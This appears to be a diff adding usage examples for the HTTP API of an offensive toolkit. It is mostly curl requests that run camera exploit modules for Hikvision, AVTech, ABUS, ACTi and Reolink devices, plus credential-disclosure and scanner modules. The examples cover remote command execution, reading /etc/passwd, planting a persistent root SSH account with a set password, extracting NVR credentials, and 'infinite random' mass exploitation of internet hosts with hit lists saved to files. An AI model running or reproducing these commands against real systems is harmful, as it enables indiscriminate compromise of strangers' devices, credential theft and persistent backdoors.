@@ -469,3 +469,528 @@ curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
       "timeout": "3"
     }
   }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# CAMERA EXPLOIT MODULES  (added 2026-03-17)
+# All modules now fully API-compatible via cfg_prompt_* wrappers.
+# Interactive CLI/shell behaviour is UNCHANGED — prompts fall back
+# to stdin when not in API mode.
+# Prompt keys match the key names documented in each module's
+# cfg_prompt_* calls.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 12. ACTi ACM-5611 RCE ──────────────────────────────────────────
+# Single target (check vuln + run command):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/acti/acm_5611_rce",
+    "target": "192.168.1.100",
+    "prompts": { "port": "8080", "command": "id" }
+  }' | python3 -m json.tool
+
+# CIDR subnet scan:
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/acti/acm_5611_rce",
+    "target": "192.168.1.0/24",
+    "prompts": { "port": "8080" }
+  }' | python3 -m json.tool
+
+# Mass scan (infinite random):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/acti/acm_5611_rce",
+    "target": "0.0.0.0",
+    "prompts": {
+      "port": "8080",
+      "exclude_ranges": "y",
+      "output_file": "acti_hits.txt",
+      "concurrency": "100"
+    }
+  }' | python3 -m json.tool
+
+# ─── 13. AVTech Camera CVE-2024-7029 RCE ────────────────────────────
+# Single target (runs vuln check, then interactive shell in CLI mode):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/avtech/cve_2024_7029_avtech_camera",
+    "target": "192.168.1.101",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# Mass scan (infinite random, exclude RFC1918):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/avtech/cve_2024_7029_avtech_camera",
+    "target": "0.0.0.0",
+    "prompts": { "exclude_ranges": "y" }
+  }' | python3 -m json.tool
+
+# ─── 14. Hikvision CVE-2021-36260 RCE ──────────────────────────────
+# mode 1=safe check  2=reboot check  3=run cmd+read output  4=blind cmd
+# 5=interactive shell (CLI only)  6=SSH shell via dropbear
+# Mass scan: scan_mode 1=safe / 2=unsafe reboot / 3=custom payload (max 22 chars)
+
+# Single target — safe vuln check:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "192.168.1.102",
+    "prompts": { "mode": "1" }
+  }' | python3 -m json.tool
+
+# Single target — execute command + read output (max 22-char cmd):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "192.168.1.102",
+    "prompts": { "mode": "3", "command": "id" }
+  }' | python3 -m json.tool
+
+# Single target — unsafe reboot check (confirm required):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "192.168.1.102",
+    "prompts": { "mode": "2", "confirm_reboot": "y" }
+  }' | python3 -m json.tool
+
+# Mass scan — safe check:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "0.0.0.0",
+    "prompts": {
+      "exclude_ranges": "y",
+      "output_file": "hikvision_hits.txt",
+      "scan_mode": "1"
+    }
+  }' | python3 -m json.tool
+
+# Mass scan — custom payload (max 22 chars):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/hikvision/hikvision_rce_cve_2021_36260",
+    "target": "0.0.0.0",
+    "prompts": {
+      "exclude_ranges": "y",
+      "output_file": "hikvision_rce_hits.txt",
+      "scan_mode": "3",
+      "custom_payload": "id>webLib/x"
+    }
+  }' | python3 -m json.tool
+
+# ─── 15. ABUS CVE-2023-26609 (LFI / RCE / SSH Persistence) ─────────
+# mode 1=LFI  mode 2=RCE  mode 3=SSH persistence
+# Mass scan: scan_mode 1=standard check  2=custom command
+
+# Single target — LFI:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "192.168.1.103",
+    "prompts": { "mode": "1", "filepath": "/etc/passwd" }
+  }' | python3 -m json.tool
+
+# Single target — RCE:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "192.168.1.103",
+    "prompts": { "mode": "2", "command": "id" }
+  }' | python3 -m json.tool
+
+# Single target — SSH persistence (new root user):
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "192.168.1.103",
+    "prompts": { "mode": "3", "password": "H@ckedR00t!" }
+  }' | python3 -m json.tool
+
+# Mass scan — standard RCE check:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "0.0.0.0",
+    "prompts": {
+      "exclude_ranges": "y",
+      "output_file": "abus_hits.txt",
+      "scan_mode": "1"
+    }
+  }' | python3 -m json.tool
+
+# Mass scan — custom command:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/abus/abussecurity_camera_cve202326609variant1",
+    "target": "0.0.0.0",
+    "prompts": {
+      "exclude_ranges": "y",
+      "output_file": "abus_rce_hits.txt",
+      "scan_mode": "2",
+      "custom_command": "id"
+    }
+  }' | python3 -m json.tool
+
+# ─── 16. Reolink CVE-2019-11001 (Authenticated RCE) ─────────────────
+# Requires valid credentials.
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/reolink/reolink_rce_cve_2019_11001",
+    "target": "192.168.1.104",
+    "prompts": {
+      "username": "admin",
+      "password": "admin123",
+      "command": "id"
+    }
+  }' | python3 -m json.tool
+
+# ─── 17. Uniview NVR Password Disclosure ────────────────────────────
+# Unauthenticated. Extracts + decodes all user credentials.
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/cameras/uniview/uniview_nvr_pwd_disclosure",
+    "target": "192.168.1.105",
+    "prompts": { "output_file": "uniview_creds.txt" }
+  }' | python3 -m json.tool
+
+# ─── 18. FTP Anonymous Login — Mass Scan ────────────────────────────
+# target "0.0.0.0" = infinite random internet scan
+
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ftp_anonymous",
+    "target": "0.0.0.0",
+    "prompts": {
+      "concurrency": "500",
+      "verbose": "n",
+      "output_file": "ftp_anon_results.txt",
+      "use_exclusions": "y"
+    }
+  }' | python3 -m json.tool
+
+# Single target FTP anon check (no prompts needed):
+curl -s --max-time 20 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ftp_anonymous",
+    "target": "192.168.1.200"
+  }' | python3 -m json.tool
+
+# ─── 19. CamXploit — Camera Discovery / Exploitation Scanner ────────
+# Fingerprints open ports, tests default creds, detects RTSP streams.
+
+# Single target:
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/camxploit/camxploit",
+    "target": "192.168.1.150"
+  }' | python3 -m json.tool
+
+# Subnet:
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/camxploit/camxploit",
+    "target": "192.168.1.0/24"
+  }' | python3 -m json.tool
+
+# Mass random internet scan:
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/camxploit/camxploit",
+    "target": "0.0.0.0",
+    "prompts": {
+      "concurrency": "200",
+      "output_file": "camxploit_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# SCANNER MODULES  (added 2026-03-19)
+# All scanner modules now fully API-compatible via cfg_prompt_*
+# wrappers. Interactive CLI/shell behaviour is UNCHANGED.
+# Prompt keys match the key names documented in config.rs
+# and each module's cfg_prompt_* calls.
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 20. Port Scanner ──────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/port_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "port_range": "1-1024",
+      "scan_method": "1",
+      "concurrency": "200",
+      "timeout": "3",
+      "show_only_open": "y",
+      "verbose": "n",
+      "output_file": ""
+    }
+  }' | python3 -m json.tool
+
+# ─── 21. SSH Scanner (Banner Grab) ───────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/ssh_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "port": "22",
+      "additional_targets": "",
+      "load_from_file": "n",
+      "threads": "10",
+      "timeout": "5",
+      "save_results": "y",
+      "output_file": "ssh_scan_results.txt"
+    }
+  }' | python3 -m json.tool
+
+# ─── 22. DNS Recursion Scanner ───────────────────────────────────
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/dns_recursion",
+    "target": "8.8.8.8",
+    "prompts": {
+      "port": "53",
+      "domain": "google.com",
+      "record_type": "A"
+    }
+  }' | python3 -m json.tool
+
+# ─── 23. HTTP Title Scanner ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/http_title_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "additional_targets": "",
+      "target_file": "",
+      "check_http": "y",
+      "check_https": "y",
+      "use_ports": "n",
+      "timeout": "10",
+      "save_results": "y",
+      "verbose": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 24. HTTP Method Scanner ────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/http_method_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "additional_targets": "",
+      "target_file": "",
+      "scheme": "https",
+      "use_ports": "n",
+      "timeout": "10",
+      "verbose": "n",
+      "save_results": "y"
+    }
+  }' | python3 -m json.tool
+
+# ─── 25. SMTP User Enum ─────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/smtp_user_enum",
+    "target": "192.168.1.1",
+    "prompts": {
+      "mode": "1",
+      "port": "25",
+      "wordlist": "/usr/share/wordlists/usernames.txt",
+      "threads": "10",
+      "timeout_ms": "3000",
+      "verbose": "n",
+      "save_valid": "y",
+      "valid_output": "smtp_valid_users.txt"
+    }
+  }' | python3 -m json.tool
+
+# ─── 26. Ping Sweep ─────────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/ping_sweep",
+    "target": "192.168.1.0/24",
+    "prompts": {
+      "add_manual_targets": "n",
+      "load_from_file": "n",
+      "timeout": "3",
+      "concurrency": "100",
+      "verbose": "n",
+      "save_up_hosts": "y",
+      "up_hosts_file": "ping_sweep_up_hosts.txt",
+      "save_down_hosts": "n",
+      "use_icmp": "y",
+      "use_tcp": "n",
+      "use_syn": "n",
+      "use_ack": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 27. Directory Brute Force ──────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/dir_brute",
+    "target": "192.168.1.1",
+    "prompts": {
+      "mode": "1",
+      "target": "192.168.1.1",
+      "use_https": "y",
+      "port": "443",
+      "base_path": "/",
+      "wordlist": "/usr/share/wordlists/dirb/common.txt",
+      "save_results": "y",
+      "sort_by": "1"
+    }
+  }' | python3 -m json.tool
+
+# ─── 28. Sequential Fuzzer ──────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/sequential_fuzzer",
+    "target": "http://192.168.1.1/",
+    "prompts": {
+      "mode": "1",
+      "min_length": "1",
+      "max_length": "3",
+      "verbose": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 29. API Endpoint Scanner ───────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/api_endpoint_scanner",
+    "target": "https://192.168.1.1",
+    "prompts": {
+      "output_dir": "api_scan_results",
+      "use_spoofing": "n",
+      "use_generic_payload": "y",
+      "enable_delete": "n",
+      "enable_extended_methods": "n",
+      "modules": "1",
+      "concurrency": "10",
+      "timeout": "10",
+      "endpoint_source": "1",
+      "endpoint_file": "/tmp/endpoints.txt"
+    }
+  }' | python3 -m json.tool
+
+# ─── 30. IPMI Enum/Exploit ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/ipmi_enum_exploit",
+    "target": "192.168.1.1",
+    "prompts": {
+      "mode": "1",
+      "target": "192.168.1.1",
+      "port": "623",
+      "test_cipher_zero": "y",
+      "test_anonymous": "y",
+      "test_default_creds": "y",
+      "test_rakp_hash": "y",
+      "concurrency": "1",
+      "output_file": "ipmi_scan_results.csv"
+    }
+  }' | python3 -m json.tool
+
+# ─── 31. SSDP MSearch Scanner ───────────────────────────────────
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/ssdp_msearch",
+    "target": "192.168.1.1",
+    "prompts": {
+      "port": "1900",
+      "timeout": "5",
+      "retries": "2",
+      "verbose": "y",
+      "save_results": "y",
+      "search_target": "ssdp:all"
+    }
+  }' | python3 -m json.tool
+
+# ─── 32. Sample Scanner ────────────────────────────────────────
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/sample_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "timeout": "5",
+      "check_http": "y",
+      "check_https": "y",
+      "verbose": "n",
+      "save_results": "y",
+      "output_file": "sample_scan.txt"
+    }
+  }' | python3 -m json.tool
